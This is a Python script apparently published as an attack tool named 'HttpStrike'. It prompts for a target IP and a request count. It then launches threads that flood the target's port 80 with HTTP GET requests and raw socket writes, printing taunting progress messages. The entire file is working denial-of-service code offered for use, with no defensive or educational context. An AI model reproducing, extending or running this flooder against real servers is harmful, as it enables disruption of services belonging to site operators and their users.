#!/bin/python3

import os
import time
import socket
import requests
import threading
from datetime import datetime
from colorama import Fore as color

C = color.CYAN
G = color.GREEN
M = color.MAGENTA
R = color.RED
Y = color.YELLOW
W = color.WHITE

useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def start():
    os.system("clear")
    print(f"{Y}")
    print(" _   _ _   _        ____  _        _ _        ")
    print("| | | | |_| |_ _ __/ ___|| |_ _ __(_) | _____ ")
    print("| |_| | __| __| '_ \___ \| __| '__| | |/ / _ \"")
    print("|  _  | |_| |_| |_) |__) | |_| |  | |   <  __/")
    print("|_| |_|\__|\__| .__/____/ \__|_|  |_|_|\_\___|")
    print("              |_|")
    print("")
    print(f"{G}[{C}!!!{G}] {C}Author                 {G}: AngelDustSec")
    print(f"{G}[{C}!!!{G}] {C}Tool-Name              {G}: {Y}HttpStrike")
    print(f"{G}[{C}!!!{G}] {C}Coded By               {G}: {Y}K3ysTr0K3R, akrdonkdon")
    print(f"{G}[{C}!!!{G}] {C}YouTube                {G}: {Y}https://youtube.com/@Anonymous")
    print(f"{G}[{C}!!!{G}] {C}GitHub                 {G}: {Y}https://github.com/K3ysTr0K3R")
    print(f"{G}[{C}!!!{G}] {C}Instagram              {G}: {Y}https://instagram.com/K3ysTr0K3R")
    print(f"{G}[{C}!!!{G}] {C}Contributor-GitHub     {G}: {Y}https://github.com/akrdon")
    print(f"{G}[{C}!!!{G}] {C}Contributor-Instagram  {G}: {Y}https://instagram.com/akrdonkdon")
    print("")

def flood(target):
    try:
        req = requests.get(f"http://{target}:80/", headers=useragent)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, 80))
        sock.sendto(req.content, (target, 80))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, 80))
        sock.close()
    except requests.exceptions.ConnectionError:
        pass
    except OSError:
        pass
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        exit()

start()
target = input("[?] Give me a target IP: ")
request_number = int(input("[?] Request Number (Default: 10): "))

try:
    start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = sock.connect_ex((target, 80))
    if connect == 0:
        start()
        print(f"{G}[{C}i{G}] {W}Scan started at {G}[{M}{hour}{Y}:{M}{minute}{Y}:{M}{day}{Y}/{M}{month}{Y}/{M}{year}{G}]")
        print("")
        print(f"{G}[{C}!{G}] {W}Connecting to {Y}{target}{G}:{Y}80")
        print(f"{G}[{C}!{G}] {W}Connected to {Y}{target}{G}:{Y}80")
        print(f"{G}[{C}!{G}] {W}Initiating Flood{G}: {Y}{target}{G}:{Y}80")
    else:
        print(f"{G}[{C}i{G}] {Y}{target}{G}:{Y}80 {W}is closed")
        exit()
except KeyboardInterrupt:
    print("\n[i] user requested interrupt")
    print("[i] shutting down...")
    exit()
except socket.gaierror:
    print("[!] hostname not found")
    exit()
except socket.error:
    print("[!] could not connect to server")
    exit()

print("")
for _ in range(1,request_number):
    threading.Thread(target=flood, args=(target,)).start()
    print(f"{G}[{C}+{G}] {W}Flooding {Y}{target} {W}on port {Y}80 {W}for {R}{_} {W}tries {G}[{M}{hour}{Y}:{M}{minute}{Y}:{M}{day}{Y}/{M}{month}{Y}/{M}{year}{G}] {G}- {C}G3T_F4CK3D")
